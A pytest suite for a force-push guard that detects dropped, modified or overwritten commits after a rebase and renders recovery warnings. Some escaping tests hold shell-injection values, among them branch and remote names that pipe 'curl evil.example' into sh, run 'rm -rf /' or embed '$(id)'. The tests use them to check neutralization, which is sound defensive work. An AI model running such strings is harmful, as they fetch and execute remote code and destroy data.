"""Tests for force_push_guard.py — post-force-push content-preservation checks."""

import subprocess
from types import SimpleNamespace

import pytest

from app.force_push_guard import (
    PushGuardFindings,
    _classify_missing_commits,
    build_push_warning,
    observe_remote_head,
    verify_content_preserved,
)


def _git(cwd, *args):
    """Run git in *cwd*, raising on failure."""
    subprocess.run(
        ["git", "-c", "user.email=t@t", "-c", "user.name=t",
         "-c", "commit.gpgsign=false", *args],
        cwd=cwd, check=True, capture_output=True, text=True,
    )


def _git_out(cwd, *args) -> str:
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True,
    ).stdout.strip()


def _commit_file(repo, name, content, message):
    (repo / name).write_text(content)
    _git(repo, "add", name)
    _git(repo, "commit", "-m", message)


@pytest.fixture
def pr_setup(tmp_path):
    """A bare remote, a seed clone, and a work clone holding a PR branch.

    Topology at fixture exit (all pushed to the bare remote):

        main:    c1 ── c2            (base advanced after the fork)
        feature: c1 ── f1 ── f2      (the PR, work clone checked out here)
    """
    bare = tmp_path / "remote.git"
    bare.mkdir()
    _git(bare, "init", "--bare", "-b", "main", ".")

    seed = tmp_path / "seed"
    _git(tmp_path, "clone", str(bare), "seed")
    _git(seed, "config", "user.email", "t@t")
    _git(seed, "config", "user.name", "t")
    _commit_file(seed, "a.txt", "one", "c1")
    _git(seed, "push", "origin", "main")
    _git(seed, "checkout", "-b", "feature")
    _commit_file(seed, "f1.txt", "f1", "feature 1")
    _commit_file(seed, "f2.txt", "f2", "feature 2")
    _git(seed, "push", "origin", "feature")
    _git(seed, "checkout", "main")
    _commit_file(seed, "b.txt", "two", "c2")
    _git(seed, "push", "origin", "main")

    work = tmp_path / "work"
    _git(tmp_path, "clone", str(bare), "work")
    _git(work, "config", "user.email", "t@t")
    _git(work, "config", "user.name", "t")
    _git(work, "checkout", "feature")
    pre_rebase_head = _git_out(work, "rev-parse", "HEAD")
    return SimpleNamespace(
        bare=bare, seed=seed, work=work, pre_rebase_head=pre_rebase_head,
    )


class TestVerifyContentPreserved:
    def test_clean_rebase_has_no_findings(self, pr_setup):
        work = pr_setup.work
        _git(work, "rebase", "origin/main")
        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[pr_setup.pre_rebase_head],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings is not None
        assert not findings.has_findings
        assert build_push_warning(findings, "feature") == ""

    def test_dropped_commit_and_file_detected(self, pr_setup):
        """A rebase that silently loses a commit is flagged as CAUTION."""
        work = pr_setup.work
        _git(work, "rebase", "origin/main")
        _git(work, "reset", "--hard", "HEAD~1")  # lose "feature 2"
        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[pr_setup.pre_rebase_head],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings.has_findings and findings.is_critical
        assert any("feature 2" in c for c in findings.dropped_commits)
        assert findings.dropped_files == ["f2.txt"]
        assert findings.modified_commits == []

        warning = build_push_warning(findings, "feature")
        assert warning.startswith("> [!CAUTION]")
        assert "feature 2" in warning
        assert "f2.txt" in warning
        assert pr_setup.pre_rebase_head in warning  # recovery SHA

    def test_modified_commit_detected_as_warning(self, pr_setup):
        """A commit whose patch changed in-flight is flagged, amber tier."""
        work = pr_setup.work
        _git(work, "rebase", "origin/main")
        (work / "f2.txt").write_text("f2-changed")
        _git(work, "add", "f2.txt")
        _git(work, "commit", "--amend", "--no-edit")
        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[pr_setup.pre_rebase_head],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings.has_findings and not findings.is_critical
        assert any("feature 2" in c for c in findings.modified_commits)
        assert findings.dropped_commits == []
        assert findings.dropped_files == []

        warning = build_push_warning(findings, "feature")
        assert warning.startswith("> [!WARNING]")
        assert "check these survived" in warning

    def test_clobbered_concurrent_push_detected(self, pr_setup):
        """A human push that lands mid-rebase and gets force-pushed over."""
        work, seed = pr_setup.work, pr_setup.seed

        # A human pushes to the PR branch while the rebase is running
        _git(seed, "checkout", "feature")
        _commit_file(seed, "hotfix.txt", "urgent", "human hotfix")
        _git(seed, "push", "origin", "feature")

        _git(work, "rebase", "origin/main")
        observed = observe_remote_head("origin", "feature", str(work))
        assert observed == _git_out(seed, "rev-parse", "HEAD")
        # The observation fetched the objects, so the commit is known locally
        _git(work, "cat-file", "-e", observed)

        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[observed],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings.is_critical
        assert any("human hotfix" in c for c in findings.clobbered_commits)

        warning = build_push_warning(findings, "feature")
        assert warning.startswith("> [!CAUTION]")
        assert "human hotfix" in warning

    def test_post_push_race_detected(self, pr_setup):
        """Someone force-pushes right after Kōan — the final check sees it."""
        work, seed = pr_setup.work, pr_setup.seed
        _git(work, "rebase", "origin/main")
        _git(work, "push", "origin", "feature", "--force")

        # Immediately afterwards the branch moves again
        _git(seed, "push", "origin", "main:feature", "--force")
        racer_sha = _git_out(seed, "rev-parse", "main")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[pr_setup.pre_rebase_head],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings.has_findings and not findings.is_critical
        assert findings.remote_head_now == racer_sha

        warning = build_push_warning(findings, "feature")
        assert warning.startswith("> [!WARNING]")
        assert racer_sha[:12] in warning

    def test_upstream_squash_merge_counts_as_preserved(self, pr_setup):
        """The PR's content lands on main as ONE squashed commit; the rebase
        drops both PR commits as become-empty. Patch-ids match nothing, but
        nothing was lost — the guard must stay silent (review finding #1)."""
        work, seed = pr_setup.work, pr_setup.seed

        # Upstream squash-merges the PR content in a single commit
        (seed / "f1.txt").write_text("f1")
        (seed / "f2.txt").write_text("f2")
        _git(seed, "add", "f1.txt", "f2.txt")
        _git(seed, "commit", "-m", "squash-merge of feature (#1)")
        _git(seed, "push", "origin", "main")

        _git(work, "fetch", "origin", "+refs/heads/main:refs/remotes/origin/main")
        _git(work, "rebase", "origin/main")  # both PR commits become empty
        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[pr_setup.pre_rebase_head],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings is not None
        assert not findings.has_findings

    def test_context_line_drift_does_not_warn(self, tmp_path):
        """Upstream edits near a PR hunk shift the patch-id on a perfectly
        clean rebase — the guard must not cry wolf (review finding #5)."""
        bare = tmp_path / "remote.git"
        bare.mkdir()
        _git(bare, "init", "--bare", "-b", "main", ".")
        seed = tmp_path / "seed"
        _git(tmp_path, "clone", str(bare), "seed")
        _git(seed, "config", "user.email", "t@t")
        _git(seed, "config", "user.name", "t")
        lines = [f"line {i}" for i in range(1, 11)]
        _commit_file(seed, "code.txt", "\n".join(lines) + "\n", "c1")
        _git(seed, "push", "origin", "main")

        # PR edits line 2
        _git(seed, "checkout", "-b", "feature")
        lines_pr = lines.copy()
        lines_pr[1] = "line 2 CHANGED BY PR"
        _commit_file(seed, "code.txt", "\n".join(lines_pr) + "\n", "pr edit")
        _git(seed, "push", "origin", "feature")

        # Upstream edits line 4 — inside the PR hunk's context window
        _git(seed, "checkout", "main")
        lines_up = lines.copy()
        lines_up[3] = "line 4 changed upstream"
        _commit_file(seed, "code.txt", "\n".join(lines_up) + "\n", "upstream edit")
        _git(seed, "push", "origin", "main")

        work = tmp_path / "work"
        _git(tmp_path, "clone", str(bare), "work")
        _git(work, "config", "user.email", "t@t")
        _git(work, "config", "user.name", "t")
        _git(work, "checkout", "feature")
        pre = _git_out(work, "rev-parse", "HEAD")
        _git(work, "rebase", "origin/main")  # clean — no conflict
        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pre, "origin/main", str(work),
            pre_push_remote_heads=[pre],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings is not None
        assert not findings.has_findings

    def test_lost_merge_resolution_detected(self, pr_setup):
        """A merge commit's own resolution content is invisible to `git cherry`
        and dropped by a plain (non --rebase-merges) rebase — the guard must
        still see it go (review finding: merge-resolution content never
        checked)."""
        work = pr_setup.work

        # The PR merges main in and resolves with content that exists in
        # neither parent (an "evil merge" — a conflict resolution).
        _git(work, "merge", "--no-commit", "--no-ff", "origin/main")
        (work / "a.txt").write_text("one\nRESOLUTION ONLY IN THE MERGE\n")
        _git(work, "add", "a.txt")
        _git(work, "commit", "-m", "Merge origin/main into feature")
        pre = _git_out(work, "rev-parse", "HEAD")
        _git(work, "push", "origin", "feature", "--force")

        # A plain rebase replays only the first-parent commits: the two feature
        # commits survive byte-for-byte, the resolution does not.
        _git(work, "checkout", "-B", "feature", "origin/main")
        _git(work, "cherry-pick", f"{pre}^^", f"{pre}^")  # the two feature commits
        _git(work, "push", "origin", "feature", "--force")
        pushed = _git_out(work, "rev-parse", "HEAD")

        findings = verify_content_preserved(
            pre, "origin/main", str(work),
            pre_push_remote_heads=[pre],
            push_remote="origin", branch="feature", pushed_head=pushed,
        )
        assert findings.is_critical
        assert any("Merge origin/main" in c for c in findings.dropped_commits)
        assert findings.dropped_files == ["a.txt"]
        # The resolution really is gone from what was pushed.
        assert "RESOLUTION" in _git_out(work, "show", f"{pre}:a.txt")
        assert "RESOLUTION" not in _git_out(work, "show", f"{pushed}:a.txt")

    def test_routine_merge_without_own_content_does_not_warn(self, pr_setup):
        """Merging the base into the PR resolves nothing of its own; dropping
        such a merge is exactly what a rebase is for — no warning."""
        work = pr_setup.work
        _git(work, "merge", "--no-ff", "-m", "Merge origin/main", "origin/main")
        pre = _git_out(work, "rev-parse", "HEAD")
        _git(work, "push", "origin", "feature", "--force")

        _git(work, "rebase", "origin/main")
        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pre, "origin/main", str(work),
            pre_push_remote_heads=[pre],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings is not None
        assert not findings.has_findings

    def test_duplicate_line_elsewhere_does_not_mask_a_drop(self, tmp_path):
        """The same text living elsewhere in the file must not make a reverted
        change look preserved (review finding: line-presence heuristic can
        silently clear dropped work)."""
        bare = tmp_path / "remote.git"
        bare.mkdir()
        _git(bare, "init", "--bare", "-b", "main", ".")
        seed = tmp_path / "seed"
        _git(tmp_path, "clone", str(bare), "seed")
        _git(seed, "config", "user.email", "t@t")
        _git(seed, "config", "user.name", "t")
        base_cfg = (
            "[service_a]\nenabled = false\n\n[service_b]\nenabled = true\n"
        )
        _commit_file(seed, "svc.ini", base_cfg, "c1")
        _git(seed, "push", "origin", "main")

        # The PR flips service_a on — text that already exists under service_b.
        _git(seed, "checkout", "-b", "feature")
        _commit_file(
            seed, "svc.ini", base_cfg.replace("false", "true"), "enable service_a",
        )
        _git(seed, "push", "origin", "feature")

        work = tmp_path / "work"
        _git(tmp_path, "clone", str(bare), "work")
        _git(work, "config", "user.email", "t@t")
        _git(work, "config", "user.name", "t")
        _git(work, "checkout", "feature")
        pre = _git_out(work, "rev-parse", "HEAD")

        # A malformed rebase loses the change entirely.
        _git(work, "reset", "--hard", "origin/main")
        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pre, "origin/main", str(work),
            pre_push_remote_heads=[pre],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings.is_critical
        assert any("enable service_a" in c for c in findings.dropped_commits)
        assert findings.dropped_files == ["svc.ini"]

    def test_clobber_detected_in_gate_push_window(self, pr_setup):
        """A human push landing between the main push and the private-gate
        re-push must be caught via the gate's own fresh observation
        (review finding #3)."""
        work, seed = pr_setup.work, pr_setup.seed
        _git(work, "rebase", "origin/main")
        step6_obs = observe_remote_head("origin", "feature", str(work))
        _git(work, "push", "origin", "feature", "--force")

        # Human pushes on top of the freshly pushed branch...
        _git(seed, "fetch", "origin")
        _git(seed, "checkout", "-B", "feature", "origin/feature")
        _commit_file(seed, "hotfix.txt", "urgent", "post-push hotfix")
        _git(seed, "push", "origin", "feature")

        # ...then the gate makes a fix and force-pushes over it
        gate_obs = observe_remote_head("origin", "feature", str(work))
        _commit_file(work, "gatefix.txt", "fix", "gate fix")
        _git(work, "push", "origin", "feature", "--force")
        pushed = _git_out(work, "rev-parse", "HEAD")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[step6_obs, gate_obs],
            push_remote="origin", branch="feature", pushed_head=pushed,
        )
        assert findings.is_critical
        assert any("post-push hotfix" in c for c in findings.clobbered_commits)
        # The gate observation contains Kōan's own step-6 push too — that must
        # not be reported, only the human's commit.
        assert not any("gate fix" in c for c in findings.clobbered_commits)
        assert len(findings.clobbered_commits) == 1

    def test_unpushed_local_commit_is_not_a_race(self, pr_setup):
        """Gate commits locally but its push fails: comparing against the
        recorded pushed SHA must not fake a post-push race and must not
        treat the unpushed commit as pipeline output (review finding #4)."""
        work = pr_setup.work
        _git(work, "rebase", "origin/main")
        _git(work, "push", "origin", "feature", "--force")
        pushed = _git_out(work, "rev-parse", "HEAD")

        # A gate fix commit exists locally but never reached the remote
        _commit_file(work, "gatefix.txt", "fix", "gate fix (push failed)")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[pr_setup.pre_rebase_head],
            push_remote="origin", branch="feature", pushed_head=pushed,
        )
        assert findings is not None
        assert findings.remote_head_now == ""  # remote == what we pushed
        assert not findings.has_findings

    def test_guard_degrades_to_none_on_bad_input(self, pr_setup):
        """An unusable baseline SHA must not raise — the guard steps aside."""
        findings = verify_content_preserved(
            "0" * 40, "origin/main", str(pr_setup.work),
            pushed_head=_git_out(pr_setup.work, "rev-parse", "HEAD"),
        )
        assert findings is None

    def test_analysis_cap_limits_per_commit_work(self, pr_setup, monkeypatch):
        """A history rewrite can mark hundreds of commits — analysis is capped
        and the cap is reported instead of stalling (review finding #6)."""
        import app.force_push_guard as fpg
        monkeypatch.setattr(fpg, "_MAX_ANALYZED", 1)
        work = pr_setup.work
        _git(work, "rebase", "origin/main")
        _git(work, "reset", "--hard", "HEAD~2")  # lose both feature commits
        _git(work, "push", "origin", "feature", "--force")

        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[pr_setup.pre_rebase_head],
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings.analysis_truncated == 1
        assert len(findings.dropped_commits) == 1
        assert "not analyzed" in build_push_warning(findings, "feature")

    def test_missing_pre_push_observation_skips_clobber_check(self, pr_setup):
        work = pr_setup.work
        _git(work, "rebase", "origin/main")
        _git(work, "push", "origin", "feature", "--force")
        findings = verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[],  # observation failed
            push_remote="origin", branch="feature",
            pushed_head=_git_out(work, "rev-parse", "HEAD"),
        )
        assert findings is not None
        assert findings.clobbered_commits == []

    def test_unconfirmed_pushed_sha_skips_the_guard(self, pr_setup):
        """Without a confirmed pushed SHA there is nothing trustworthy to
        compare against — local HEAD may hold commits that never reached the
        remote, so the guard must report itself skipped, not analyze it."""
        work = pr_setup.work
        _git(work, "rebase", "origin/main")
        _git(work, "push", "origin", "feature", "--force")
        # A later local commit that never got pushed
        _commit_file(work, "local.txt", "local", "unpushed work")

        assert verify_content_preserved(
            pr_setup.pre_rebase_head, "origin/main", str(work),
            pre_push_remote_heads=[pr_setup.pre_rebase_head],
            push_remote="origin", branch="feature",
            pushed_head="",
        ) is None


class TestObserveRemoteHead:
    def test_returns_remote_tip(self, pr_setup):
        sha = observe_remote_head("origin", "feature", str(pr_setup.work))
        assert sha == pr_setup.pre_rebase_head

    def test_unreachable_remote_returns_empty(self, pr_setup):
        assert observe_remote_head("nope", "feature", str(pr_setup.work)) == ""

    def test_missing_branch_returns_empty(self, pr_setup):
        assert observe_remote_head("origin", "ghost", str(pr_setup.work)) == ""


class TestClassifyMissingCommits:
    def test_empty_commit_is_not_flagged(self, pr_setup):
        """Rebase legitimately drops empty commits — never report them lost."""
        work = pr_setup.work
        _git(work, "commit", "--allow-empty", "-m", "empty marker")
        empty_sha = _git_out(work, "rev-parse", "HEAD")
        head = _git_out(work, "rev-parse", "HEAD")
        dropped, modified, touched = _classify_missing_commits(
            str(work), [(empty_sha, False)], set(), pr_setup.pre_rebase_head, head,
        )
        assert dropped == [] and modified == [] and touched == set()

    def test_unreadable_commit_is_reported_not_cleared(self, pr_setup):
        """A git failure must never be converted into 'preserved' — an
        unverifiable commit is surfaced for a human instead (review finding
        'error converted to empty result')."""
        work = pr_setup.work
        head = _git_out(work, "rev-parse", "HEAD")
        dropped, modified, touched = _classify_missing_commits(
            str(work), [("0" * 40, False)], set(), pr_setup.pre_rebase_head, head,
        )
        assert dropped == [] and touched == set()
        assert modified == ["000000000000"]


class TestBuildPushWarning:
    def test_none_findings_render_empty(self):
        assert build_push_warning(None, "feature") == ""

    def test_clean_findings_render_empty(self):
        assert build_push_warning(PushGuardFindings(), "feature") == ""

    def test_single_alert_even_with_every_finding_type(self):
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            pushed_head="b" * 40,
            dropped_commits=["abc1234 lost work"],
            modified_commits=["def5678 reshaped work"],
            dropped_files=["x.txt"],
            clobbered_commits=["9990000 human push"],
            remote_head_now="c" * 40,
        )
        warning = build_push_warning(findings, "feature")
        assert warning.count("[!") == 1  # parsimony: exactly one alert block
        assert warning.startswith("> [!CAUTION]")
        for token in ("lost work", "reshaped work", "x.txt", "human push",
                      "c" * 12, "a" * 40):
            assert token in warning

    def test_long_lists_are_truncated(self):
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            dropped_commits=[f"sha{i:04d} subject {i}" for i in range(12)],
        )
        warning = build_push_warning(findings, "feature")
        assert "… and 2 more" in warning
        assert "subject 11" not in warning

    def test_recovery_instructions_always_present(self):
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            modified_commits=["abc1234 tweaked"],
        )
        warning = build_push_warning(findings, "feature")
        # The fetch must use the FULL SHA — git fetch cannot expand
        # abbreviated SHAs into want-lines, so a short SHA never works.
        assert f"git fetch origin {'a' * 40}" in warning
        assert "git switch -c koan-prerebase-aaaaaaaaaaaa FETCH_HEAD" in warning

    def test_recovery_command_carries_no_branch_controlled_text(self):
        """A maintainer pastes this into a shell. Ref names may legally contain
        $(), backticks, ';' and '&' — none of it may reach the command."""
        branch = "fix$(curl${IFS}evil.example/p|sh)`whoami`;rm -rf /"
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            dropped_commits=["abc1234 lost"],
        )
        warning = build_push_warning(findings, branch)
        command = warning.split("recoverable: ")[1]
        assert "$(" not in command
        assert "`" not in command.rstrip("`")[1:]  # only the span delimiters
        assert ";" not in command
        assert "git switch -c koan-prerebase-aaaaaaaaaaaa FETCH_HEAD" in command
        # The branch is still named in the prose, but only inside a code span
        # it cannot escape (backticks squashed to quotes).
        assert branch.replace("`", "'") in warning
        assert branch not in warning

    def test_recovery_command_quotes_a_hostile_remote(self):
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            dropped_commits=["abc1234 lost"],
        )
        warning = build_push_warning(
            findings, "feature", remote="fork;curl evil.example|sh",
        )
        assert "git fetch 'fork;curl evil.example|sh'" in warning

    def test_unusable_baseline_sha_yields_a_static_backup_name(self):
        """A non-SHA baseline must not be spliced into a branch name."""
        findings = PushGuardFindings(
            pre_rebase_head="$(id)",
            dropped_commits=["abc1234 lost"],
        )
        warning = build_push_warning(findings, "feature")
        assert "git switch -c koan-prerebase-backup FETCH_HEAD" in warning
        assert "git fetch origin '$(id)'" in warning

    def test_recovery_command_uses_actual_push_remote(self):
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            modified_commits=["abc1234 tweaked"],
        )
        warning = build_push_warning(findings, "feature", remote="fork-alice")
        assert f"git fetch fork-alice {'a' * 40}" in warning
        assert "git fetch origin" not in warning

    def test_commit_subjects_are_neutralized_in_code_spans(self):
        """Subjects are attacker-influenced: no mentions/markdown may render."""
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            dropped_commits=["abc1234 @everyone [pwn](https://evil) `x"],
        )
        warning = build_push_warning(findings, "feature")
        # Wrapped in a code span, with embedded backticks squashed so the
        # subject cannot terminate its own span.
        assert "- `abc1234` `@everyone [pwn](https://evil) 'x`" in warning

    def test_dropped_files_truncation_is_visible(self):
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            dropped_commits=["abc1234 lost"],
            dropped_files=[f"file{i:02d}.txt" for i in range(12)],
        )
        warning = build_push_warning(findings, "feature")
        assert "… and 2 more" in warning
        assert "file11.txt" not in warning

    def test_analysis_truncation_is_reported(self):
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            analysis_truncated=57,
        )
        assert findings.has_findings and not findings.is_critical
        warning = build_push_warning(findings, "feature")
        assert warning.startswith("> [!WARNING]")
        assert "57" in warning and "not analyzed" in warning

    def test_non_github_provider_degrades_to_plain_prefix(self):
        findings = PushGuardFindings(
            pre_rebase_head="a" * 40,
            dropped_commits=["abc1234 lost"],
        )
        warning = build_push_warning(findings, "feature", provider="jira")
        assert warning.startswith("CAUTION:")
        assert "[!CAUTION]" not in warning
